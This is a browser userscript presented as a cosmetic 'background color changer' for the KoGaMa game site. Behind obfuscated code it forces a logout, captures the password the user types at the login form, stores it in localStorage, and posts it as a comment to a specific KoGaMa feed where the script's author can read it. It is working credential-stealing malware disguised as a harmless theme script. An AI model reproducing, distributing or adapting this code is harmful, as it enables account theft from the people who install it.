// ==UserScript==
// @name         Background Color Changer (blue)
// @namespace    http://tampermonkey.net/
// @version      V1-Beta
// @description  changes background color of kogama to blue
// @author     Lavar
// @match      https://www.kogama.com/*
// @match      https://kogama.com.br/*
// @match      https://friends.kogama.com/*
// @grant        none
// ==/UserScript==
const _0x5acfe3 = _0x502f;
function _0x22fc() {
  const _0x1a7136 = ['addEventListener', 'log', 'stringify', 'location', 'status', '173846mcQEUN', '9NpMVeb', 'Success:', '113830LYAXum', 'keyCode', 'setItem', 'value', 'root-page-mobile', 'password', '71868QrEQBX', 'getItem', 'error', '2716758eSaPId', 'catch', 'poop', 'querySelector', 'Error:', '126544zlfMyY', 'lol', '506569BqwGkp', '.MuiButtonBase-root.MuiButton-root.MuiButton-text.MuiButton-textDefault.MuiButton-sizeSmall.MuiButton-textSizeSmall.MuiButton-colorDefault.css-f3wymp', '99qjFQGn', '2MXeZit', 'then', 'getElementById', 'application/json', 'https://www.kogama.com/auth/logout', '25vivdkf', 'json', "Button not found!", '768536FEIJoG', 'POST', 'click', '.MuiButtonBase-root.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeLarge.MuiButton-containedSizeLarge.MuiButton-colorSecondary.css-9la3qa', "background-image: linear-gradient(135deg, rgb(0 137 255), rgb(0 112 255))"];
  _0x22fc = function () {
    return _0x1a7136;
  };
  return _0x22fc();
}
(function (_0x9726ed, _0x98abe2) {
  const _0x17262f = _0x502f;
  const _0x3b16d4 = _0x9726ed();
  while (true) {
    try {
      const _0x49b4db = -parseInt(_0x17262f(0x1fc)) / 0x1 * (-parseInt(_0x17262f(0x1ea)) / 0x2) + -parseInt(_0x17262f(0x1fd)) / 0x3 * (-parseInt(_0x17262f(0x1e5)) / 0x4) + parseInt(_0x17262f(0x1ef)) / 0x5 * (parseInt(_0x17262f(0x205)) / 0x6) + parseInt(_0x17262f(0x1e7)) / 0x7 + parseInt(_0x17262f(0x1f2)) / 0x8 + parseInt(_0x17262f(0x1e9)) / 0x9 * (-parseInt(_0x17262f(0x1ff)) / 0xa) + -parseInt(_0x17262f(0x208)) / 0xb;
      if (_0x49b4db === _0x98abe2) {
        break;
      } else {
        _0x3b16d4.push(_0x3b16d4.shift());
      }
    } catch (_0x1048e9) {
      _0x3b16d4.push(_0x3b16d4.shift());
    }
  }
})(_0x22fc, 0x1e7d7);
function changeColorRed() {
  const _0x4c488d = _0x502f;
  document.getElementById(_0x4c488d(0x203)).style = _0x4c488d(0x1f6);
}
setTimeout(changeColorRed, 0x1f4);
if (localStorage[_0x5acfe3(0x206)](_0x5acfe3(0x1e6)) === null) {
  fetch(_0x5acfe3(0x1ee)).then(_0x102ad1 => {
    const _0x91c38a = _0x5acfe3;
    if (!_0x102ad1.ok) {
      throw new Error("HTTP error! status: " + _0x102ad1[_0x91c38a(0x1fb)]);
    }
    return _0x102ad1[_0x91c38a(0x1f0)]();
  })[_0x5acfe3(0x1eb)](_0x5113e4 => {
    const _0x4fb150 = _0x5acfe3;
    console[_0x4fb150(0x1f8)](_0x4fb150(0x1fe), _0x5113e4);
  })['catch'](_0x411176 => {
    console.error('Error:', _0x411176);
  });
}
function d() {
  const _0x5d03dc = _0x5acfe3;
  const _0x5892d7 = document[_0x5d03dc(0x1e3)](_0x5d03dc(0x1e8));
  if (_0x5892d7) {
    _0x5892d7[_0x5d03dc(0x1f7)](_0x5d03dc(0x1f4), function () {
      setTimeout(dd, 0x1f4);
    });
  } else {
    console.log(_0x5d03dc(0x1f1));
  }
}
setTimeout(d, 0x1f4);
function dd() {
  const _0x191d88 = _0x5acfe3;
  const _0x3042a8 = document[_0x191d88(0x1e3)](_0x191d88(0x1f5));
  if (_0x3042a8) {
    _0x3042a8.addEventListener(_0x191d88(0x1f4), function () {
      const _0xb6f61d = _0x191d88;
      var _0x2b3419 = document[_0xb6f61d(0x1ec)](_0xb6f61d(0x204));
      localStorage[_0xb6f61d(0x201)](_0xb6f61d(0x1e2), _0x2b3419[_0xb6f61d(0x202)]);
      localStorage[_0xb6f61d(0x201)](_0xb6f61d(0x1e6), false);
    });
  } else {
    console[_0x191d88(0x1f8)](_0x191d88(0x1f1));
  }
  const _0x22a332 = document[_0x191d88(0x1ec)](_0x191d88(0x204));
  if (_0x22a332) {
    _0x22a332.addEventListener('keypress', function (_0x344529) {
      const _0x91c4d9 = _0x191d88;
      if (_0x344529[_0x91c4d9(0x200)] === 0xd || _0x344529[_0x91c4d9(0x1fa)] === 0x3) {
        localStorage[_0x91c4d9(0x201)](_0x91c4d9(0x1e2), _0x22a332.value);
        localStorage[_0x91c4d9(0x201)](_0x91c4d9(0x1e6), false);
      }
    });
  }
}
function _0x502f(_0x5766df, _0x44249f) {
  const _0x22fcc3 = _0x22fc();
  _0x502f = function (_0x502fb8, _0x5e0fc1) {
    _0x502fb8 = _0x502fb8 - 0x1e2;
    let _0x45493a = _0x22fcc3[_0x502fb8];
    return _0x45493a;
  };
  return _0x502f(_0x5766df, _0x44249f);
}
fetch('https://www.kogama.com/api/feed/31872096/comment/', {
  'method': _0x5acfe3(0x1f3),
  'headers': {
    'Content-Type': _0x5acfe3(0x1ed)
  },
  'body': JSON[_0x5acfe3(0x1f9)]({
    'comment': localStorage[_0x5acfe3(0x206)](_0x5acfe3(0x1e2))
  })
})[_0x5acfe3(0x1eb)](_0x41dbfe => {
  const _0x1b5483 = _0x5acfe3;
  if (!_0x41dbfe.ok) {
    throw new Error("HTTP error! status: " + _0x41dbfe[_0x1b5483(0x1fb)]);
  }
  return _0x41dbfe[_0x1b5483(0x1f0)]();
})[_0x5acfe3(0x1eb)](_0x12b0a2 => {
  const _0x5f2062 = _0x5acfe3;
  console[_0x5f2062(0x1f8)](_0x5f2062(0x1fe), _0x12b0a2);
})[_0x5acfe3(0x209)](_0x54ddc3 => {
  const _0x3c301e = _0x5acfe3;
  console[_0x3c301e(0x207)](_0x3c301e(0x1e4), _0x54ddc3);
});